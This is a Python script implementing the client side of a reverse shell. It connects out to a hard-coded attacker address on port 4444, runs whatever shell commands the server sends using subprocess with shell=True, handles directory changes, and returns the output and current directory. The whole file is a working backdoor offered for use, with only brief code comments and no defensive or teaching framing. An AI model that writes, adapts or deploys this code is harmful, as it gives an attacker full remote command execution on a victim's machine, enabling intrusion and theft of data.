import socket
import os
from termcolor import colored
import sys
import subprocess

# FORMAT: format that used to decode and encode
# HEADERSIZE: header size is used to determine the length of messages
FORMAT = "utf-8"
HEADERSIZE = 16

# ip and port of the server to start reverse shell

IP = "192.168.1.104" # change this to your ip
PORT = 4444          # change this
ADDR = (IP, PORT)


# function to run the commands sended by server and return the result
def run_command(cmd):
    try:
        # if sended command is change directory
        if cmd.split(" ")[0] == "cd":
            try:
                os.chdir(cmd.split(" ")[1])
                return os.getcwd() + "#> "
            # if the path sended with cd command is not a valid path
            except :
                return ("[!] Invalid path\n\n" + os.getcwd() + "#> ")
        else:
            # run the command and capture stdout and stderr
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True)

            # invalid command
            if output.stderr:
                error = output.stderr + "\n"
                error = error + os.getcwd() + "#> "
                return error 

            output = output.stdout + "\n"
            # send output along with current working directory to server, for server to know where they are
            output = output + os.getcwd() + "#> "
            return output 
    except:
        return ""


# make a header for every message that is going to be send.
# this header contain message length so this way by reading header first 
# server can easily find the length of message
def send_to_server(client_sock, output):
    headersize = len(output)
    headersize = str(headersize)
    header = headersize + " " * (HEADERSIZE - len(headersize))
    output = (header + output).encode(FORMAT)
    client_sock.send(output)


# this function get commands sended by server and pass it to run_command function
# and then send the result back to server
def recv_from_server(client_sock):
    while True:
        header = client_sock.recv(HEADERSIZE).decode(FORMAT)
        if header:
            cmd_size = int(header.strip(" "))
            cmd = client_sock.recv(cmd_size).decode(FORMAT)
            if cmd != "":
                output = run_command(cmd)
                send_to_server(client_sock, output)
        


def main():
    # create socket using INET(ipv4) family and tcp type protocol
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # try to connet to server
        client.connect( ADDR )
    except Exception as err:
        print(colored("[!] Connection error: " + str(err), 'red'))
        client.close()
        sys.exit()

    try:
        recv_from_server(client)
    except KeyboardInterrupt:
        print(colored("\n[!] Closing Connection ", 'yellow'))
        client.close()
        sys.exit()

if __name__ == "__main__":
    main()